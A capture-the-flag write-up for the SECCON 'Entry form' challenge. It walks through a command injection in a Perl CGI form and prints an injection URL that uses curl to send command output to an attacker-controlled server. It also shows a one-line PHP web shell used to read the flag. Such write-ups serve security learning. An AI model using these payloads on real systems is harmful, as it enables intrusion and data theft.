Entry form
----------

Another pretty easy problem. We are given a link to a form where we can enter a username and email. After submitting the form the page says "Your entry was sent". Not very much going on here.

The page is a cgi script, and is probably injectable.

We take a look at the root of the web server (http://entryform.pwn.seccon.jp), and notice that it is shows the directory structure. From there we find the file `register.cgi_bak`, apparently the source code for the entry form:


Here is the most interesting part of that file:
```
if($q->param("mail") ne '' && $q->param("name") ne '') {
  open(SH, "|/usr/sbin/sendmail -bm '".$q->param("mail")."'");
  print SH "From: keigo.yamazaki\@seccon.jp\nTo: ".$q->param("mail")."\nSubject: from SECCON Entry Form\n\nWe received your entry.\n";
  close(SH);
  
  open(LOG, ">>log"); ### <-- FLAG HERE ###
  flock(LOG, 2);
  seek(LOG, 0, 2);
  print LOG "".$q->param("mail")."\t".$q->param("name")."\n";
  close(LOG);
```

The `open` call runs commands by concatinating a string with user input. We can add a single quote to the `mail` query string argument, then inject arbitrary commands. Here is a url that runs the ls command, and sends the output to a server we control.
```
http://entryform.pwn.seccon.jp/register.cgi?mail=%27`curl%20<my server>:9999/%20--data%20%22$(ls)%22`%27&name=asdf&action=Send
```
*Note: I used `curl -d` to send the results of the commands I ran to a server I controlled, but apparently that was not needed; you could just run the commandand the results would show up in the page.*

Either way, next we try to run `cat log`, but this does not work because the user we are running commands as only has write permissions to that file.

Conveniently, we find a script `backdoor123.php` under the `SECRETS` directory on the web server. It provides a way around this issue:
```
<pre><?php system($_GET['cmd']); ?></pre>
```

From there, we simple run `head` to get the flag out of the log file.

The final url:
```
http://entryform.pwn.seccon.jp/SECRETS/backdoor123.php?cmd=head%20-n3%20../log
```

And the flag: SECCON{Glory_will_shine_on_you.}
